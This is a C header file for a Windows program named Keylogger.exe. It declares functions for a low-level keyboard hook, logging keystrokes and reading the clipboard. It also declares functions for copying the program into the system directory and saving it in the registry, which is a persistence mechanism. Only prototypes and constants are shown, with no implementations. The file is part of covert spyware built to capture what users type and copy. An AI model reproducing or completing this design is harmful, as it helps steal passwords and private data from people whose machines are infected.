#pragma once

#ifndef __KEYLOGGER_H_INCLUDED__
#define __KEYLOGGER_H_INCLUDED__

#include <Windows.h>

#define KEYLOGGER_APP_NAME TEXT("Keylogger.exe")
#define KEYLOGGER_BUFFER_LENGTH 64
#define KEYBOARD_STATE_SIZE     256
#define SMALL_BUFFER_LENGTH     256

CONST PTCHAR GetVirtualKeyName(CONST DWORD vkCode);
CONST PTCHAR GetClipboardBuffer();
BOOL LogKey(CONST PKBDLLHOOKSTRUCT kbdhs);
LRESULT WINAPI KeyboardHook(INT code, WPARAM wParam, LPARAM lParam);
BOOL SetKeyboardHook();
BOOL Copy2Sysdir(CONST PTCHAR appname);
BOOL SaveInReg(CONST PTCHAR appname);
VOID PrintError(CONST PTCHAR msg, INT error);

#endif /* __KEYLOGGER_H_INCLUDED__ */